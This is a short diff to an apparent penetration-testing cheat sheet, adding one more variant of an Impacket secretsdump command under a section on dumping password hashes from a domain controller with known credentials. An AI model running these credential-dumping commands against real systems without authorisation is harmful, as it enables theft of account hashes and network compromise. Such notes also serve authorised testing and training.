@@ -117,6 +117,8 @@ Dump hashes using account credentials:
 impacket-secretsdump -dc-ip $TARGET_IP $USER:$PASSWORD@$TARGET_DOMAIN
 #OR try
 impacket-secretsdump $USER:$PASSWORD@$TARGET_IP
+#or
+secretsdump.py $DOMAIN/$USER:$PASSWORD@$DOMAIN_CONTROLLER
 ```
 
 ```bash
